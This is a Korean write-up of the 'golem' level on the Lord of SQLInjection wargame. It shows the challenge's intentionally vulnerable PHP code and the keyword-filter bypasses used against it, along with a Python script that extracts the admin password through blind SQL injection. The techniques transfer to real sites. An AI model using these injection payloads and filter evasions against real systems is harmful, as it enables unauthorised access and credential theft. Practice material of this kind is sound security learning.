{"pageProps":{"post":{"slug":"2017-08-21-LOS-golem","content":"\n### https://los.eagle-jump.org/ 버전\n![](/assets/posts/los/golem.png)\n\n`query : select id from prob_golem where id='guest' and pw=''`\n\n```php\n<?php \n  include \"./config.php\"; \n  login_chk(); \n  dbconnect(); \n  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\"); \n  if(preg_match('/or|and|substr\\(|=/i', $_GET[pw])) exit(\"HeHe\"); \n  $query = \"select id from prob_golem where id='guest' and pw='{$_GET[pw]}'\"; \n  echo \"<hr>query : <strong>{$query}</strong><hr><br>\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if($result['id']) echo \"<h2>Hello {$result[id]}</h2>\"; \n   \n  $_GET[pw] = addslashes($_GET[pw]); \n  $query = \"select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'\"; \n  $result = @mysql_fetch_array(mysql_query($query)); \n  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve(\"golem\"); \n  highlight_file(__FILE__); \n?>\n```\n\ngolem 문제는 or, and, substr, = 등등 여러가지가 필터링된다.\n```\nor -> ||\n\nand -> &&(%26%26)\n\nsubstr -> substring\n\n= -> like\n```\n\n위와 같이 우회해주면 된다.\n\norge 문제를 풀 때 썼던 코드가 왜인지 안먹혀서...다른 분의 코드를 참고해서 다시 작성하였다.\n\n```py\nimport urllib2\nimport urllib\nimport requests\n\nflag = \"\"\nlength = 0\n\nurl = \"https://los.eagle-jump.org/golem_~~~.php\"\nsession = dict(PHPSESSID = \"자신의 세션 아이디\")\n\nfor i in range(0, 20):\n        query = url + \"?pw=1' || id like 'admin' %26%26 length(pw) like \" + str(i) + \"%23\"\n        r = requests.post(query, cookies=session)\n\n        if 'Hello admin' in r.text:\n                length = i\n                break\n\nprint \"password length is \",length\n\nfor j in range(1, length + 1):\n        for i in range(48, 128):\n                query = url + \"?pw=1' || id like 'admin' %26%26 mid(pw, \" + str(j) + \", 1) like '\" + chr(i)\n                r = requests.post(query, cookies=session)\n\n                if 'Hello admin' in r.text:\n                        flag += chr(i)\n                        break\n\nprint \"password is\",flag\n```\n\n실행 결과는 다음과 같다.\n![](/assets/posts/los/golem_password.png)\npassword의 길이는 8, password는 88e3137f\n\n이 값을 `?pw=88e3137f` 이렇게 넘겨주면 풀린다.\n\n![](/assets/posts/los/golem_clear.png)\n \n\n### https://los.rubiya.kr 버전\n\n![](/assets/posts/los/golem_result.png)\n\n![](/assets/posts/los/golem_py_clear.png)\n","layout":"post","title":"[LOS] golem","categories":["LOS"],"excerpt":" ","comments":true,"share":true,"tags":["LOS","Web-hacking","golem","write-up"]}},"__N_SSG":true}